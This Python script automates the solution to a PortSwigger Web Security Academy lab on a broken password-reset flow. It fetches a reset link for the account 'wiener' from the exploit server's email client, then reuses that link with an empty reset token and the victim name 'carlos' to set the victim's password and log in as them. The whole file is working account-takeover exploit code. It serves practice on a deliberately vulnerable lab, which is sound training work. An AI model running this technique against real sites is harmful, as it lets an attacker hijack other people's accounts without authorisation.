import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        self.my_account_username = 'wiener'
        self.victim_username = 'carlos'
        self.my_account_reset_url = None

    def forget_my_account_password(self):
        data = {
            'username': self.my_account_username
        }
        self.session.post(self.lab_url + 'forgot-password', data=data)
        response = self.session.get(self.exploit_server_url + 'email')
        self.my_account_reset_url = re.findall('<a href=(\'https://.*.web-security-academy.net.*)target.*</a>',
                                               response.text)[0].strip('\'')

    def forget_victim_password(self):
        data = {
            'username': self.victim_username
        }
        self.session.post(self.lab_url + 'forgot-password', data=data)
        data = {
            'temp-forgot-password-token': '',
            'username': self.victim_username,
            'new-password-1': 'hacker',
            'new-password-2': 'hacker'
        }
        self.session.post(self.my_account_reset_url, data=data)

    def sing_in_as_victim_user(self):
        data = {
            'username': self.victim_username,
            'password': 'hacker'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.forget_my_account_password()
        self.forget_victim_password()
        self.sing_in_as_victim_user()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1], sys.argv[2])
lab_solver.solve()
